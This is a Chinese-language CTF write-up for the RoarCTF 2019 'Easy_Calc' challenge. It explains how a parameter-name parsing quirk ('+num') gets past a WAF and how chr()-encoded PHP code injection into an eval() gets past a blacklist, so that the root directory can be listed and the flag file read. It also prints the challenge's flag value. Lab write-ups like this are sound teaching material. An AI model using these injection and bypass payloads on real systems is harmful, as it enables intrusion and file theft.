---
tags:
  - BuuCTF
  - 简单
  - PHP
  - WAF
  - 字符串解析
---

# \[RoarCTF 2019\] Easy_Calc

## 前置工作

进入靶机网页，随便测试一下，就发现一般的手段行不通了

![](https://p.sda1.dev/13/06513b02569849d88f42b0a62277f0b6/image.png)

打开 F12 看源码，发现他已经使用了 WAF（但是这个 WAF 策略我们是无从得知的），以及下面有一个 Ajax 使用 GET 请求将参数 `num` 给到了 `calc.php`

![](https://p.sda1.dev/13/2172087003d37976776f72fdb21a1fba/image.png)

我们进入 `/calc.php`，发现下面的源代码，仔细阅读下就能发现我们输入数据的黑名单，但现在首要目的是先绕过 WAF 的限制，使得我们传入的 `num` 参数能进入这个 PHP 代码中被执行

```php
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?>
```

## WAF 绕过

我从 [FreeBuf](https://www.freebuf.com/articles/web/213359.html) 上找来了两张图片，可以说明 PHP 对传入参数的处理是怎么样的

![](https://p.sda1.dev/13/05736632a670e277acba2c1d82e15c95/image.png)

![](https://p.sda1.dev/13/53ed3879e34ebb48992e0d9cb0d1209b/image.png)

通过以上解释，我们就能尝试着绕过 WAF 的判断了，我们可以把传入的参数 `num` 改成 `+num`，因为这个 `+` 到 PHP 解析的时候就会被省略掉，到头来还是 `num`，但是对于 WAF 就不一样了，他只会觉得我们没有给 WAF 提供 `num` 参数，于是就很轻松地绕过了 WAF 的判断，现在，我们已经可以向 `num` 传入字符了

## 黑名单绕过

查看 `$blacklist` 数组，发现想绕过的话，一般的方法都用不了，我们通常都用 `system("ls /")` 来查看当前目录下的文件，但是使用 `system("ls /")` 就会直接触发黑名单，因为又有空格，又有引号，那么我们只能使用另外的方法了

### 扫描目录

直接说答案 **`+num=var_dump(scandir(chr(47)))`**，`chr(47)` 即 `/`，`scandir()` 就是扫描当前目录，`var_dump()` 就是调试模式输出内容（与 `echo` 单纯的打印字符串不同，`var_dump()` 可以打印变量信息），将 `+num=var_dump(scandir(chr(47)))` 传入后可看到以下内容，发现有一个 `f1agg` 文件

```
array(24) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(10) ".dockerenv" [3]=> string(3) "bin" [4]=> string(4) "boot" [5]=> string(3) "dev" [6]=> string(3) "etc" [7]=> string(5) "f1agg" [8]=> string(4) "home" [9]=> string(3) "lib" [10]=> string(5) "lib64" [11]=> string(5) "media" [12]=> string(3) "mnt" [13]=> string(3) "opt" [14]=> string(4) "proc" [15]=> string(4) "root" [16]=> string(3) "run" [17]=> string(4) "sbin" [18]=> string(3) "srv" [19]=> string(8) "start.sh" [20]=> string(3) "sys" [21]=> string(3) "tmp" [22]=> string(3) "usr" [23]=> string(3) "var" }
```

### 阅读文件

阅读文件的时候也需要使用特殊的方法，毕竟我们对引号和空格没有使用权，那么我们就使用老方法，先说答案 **`+num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))`**，其中 `chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)` = `/f1agg`，`file_get_contents()` 就是从某个文件中阅读内容并输出，最后即可得出 Flag 为 `flag{9b928004-5776-4b60-bbb9-d32152c62db7}`